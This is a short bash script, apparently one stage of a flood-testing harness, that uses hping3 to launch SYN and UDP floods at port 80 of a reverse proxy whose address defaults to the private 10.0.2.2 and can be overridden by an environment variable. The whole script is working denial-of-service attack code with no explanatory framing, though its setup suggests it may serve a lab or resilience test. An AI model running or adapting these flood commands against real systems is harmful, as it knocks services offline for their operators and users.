#!/bin/bash
# Intermediate layer: volumetric L3/L4 floods against the reverse proxy.
set -euo pipefail
source "$(dirname "$0")/lib.sh"

TARGET="${TARGET:-10.0.2.2}"

need hping3
echo "attacking proxy ${TARGET} for ${DURATION}s"

launch "hping3 SYN flood" hping3 -S --flood -p 80 "${TARGET}"
launch "hping3 UDP flood" hping3 -2 --flood -p 80 "${TARGET}"

finish
